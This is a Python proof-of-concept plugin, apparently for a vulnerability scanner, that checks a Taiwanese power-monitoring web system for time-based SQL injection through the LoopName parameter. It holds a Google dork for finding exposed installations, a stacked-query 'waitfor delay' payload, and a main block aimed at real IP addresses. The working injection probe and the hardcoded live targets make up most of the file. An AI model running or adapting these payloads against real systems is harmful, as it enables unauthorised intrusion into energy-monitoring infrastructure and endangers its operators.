#!/usr/bin/env python
# coding: UTF-8

'''
author: yichin
name: 台湾省某电力监控系统通用型注入(三)
refer: http://www.wooyun.org/bugs/wooyun-2010-0102615
description:
    google dork:"智慧型電能監控管理系統"
    http://foorbar/PowerRecordY.aspx?Date=2015&LoopName=1.1 Parameter: LoopName (GET)
    type: stack queries, boolean-based blind
'''

import re
import urlparse
import time

def assign(service, arg):
    if service == 'electric_monitor':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    waitfor_0 = arg + 'PowerRecordY.aspx?Date=2015&LoopName=1.1);waitfor%20delay%20%270:0:0%27--'
    waitfor_5 = arg + 'PowerRecordY.aspx?Date=2015&LoopName=1.1);waitfor%20delay%20%270:0:5%27--'  
    t0 = time.time()
    code1, head, res, err, _ = curl.curl2(waitfor_0)
    t_0 = time.time()-t0
    if code1 == 0:
        return False
    t5 = time.time()    
    code2, head, res, err, _ = curl.curl2(waitfor_5)
    t_5 = time.time()-t5
    if code2 == 0:
        return False

    if code1==200 and code2==200 and t_5>5 and t_0<3:
        security_hole('SQL injection: ' + waitfor_5)
    
if __name__ == '__main__':
    from dummy import *
    audit(assign('electric_monitor','http://140.129.117.243/')[1])
    #audit(assign('electric_monitor','http://203.71.247.31/')[1])